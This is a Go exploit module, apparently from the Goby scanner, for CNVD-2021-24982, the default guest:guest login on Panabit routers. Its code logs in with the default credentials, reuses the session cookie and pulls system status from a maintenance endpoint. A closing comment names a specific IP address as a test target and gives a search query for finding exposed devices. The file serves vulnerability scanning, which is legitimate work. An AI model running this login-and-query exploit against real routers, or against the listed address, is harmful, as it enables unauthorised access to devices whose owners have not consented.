package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit router default password CNVD-2021-24982",
    "Description": "Panabit router has a default password. Attackers can log in throung guest:guest,check the system status,and configurate the device.",
    "Product": "Panabit router",
    "Homepage": "https://www.panabit.com/",
    "DisclosureDate": "2021-06-01",
    "Author": "gonosecto@protonmail.com",
    "GobyQuery": "product=\"Panabit-intelligent gateway\"",
    "Level": "3",
    "Impact": "<p> Attackers can log in throung guest:guest,check the system status,and configurate the device.</p>",
    "Recommendation": "<p>Modify the default password of the device</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-24982"
    ],
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": [
        "CNVD-2021-24982"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10249"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/login/userverify.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "username=guest&password=guest&code=&pacheckcode=0"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie") {
					ss.VulURL = fmt.Sprintf("%s://guest:guest@%s/login/login.htm", u.Scheme(), u.HostInfo)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/login/userverify.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "username=guest&password=guest&code=&pacheckcode=0"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie") {
					Cookie := resp.Header.Get("Set-Cookie") + "pacheckcode=0; paremcheck=0; xxxxxxx=; yyyyyyy=; lang=zh"
					uri := "/cgi-bin/Maintain/ajax_top"
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.Header.Store("Cookie", Cookie)
					cfg.VerifyTls = false
					cfg.Data = "action=sysrun"
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						expResult.Output = resp.Utf8Html
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}

//test vul url:https://61.144.159.135:8443
//fofa query:app="Panabit-智能网关"
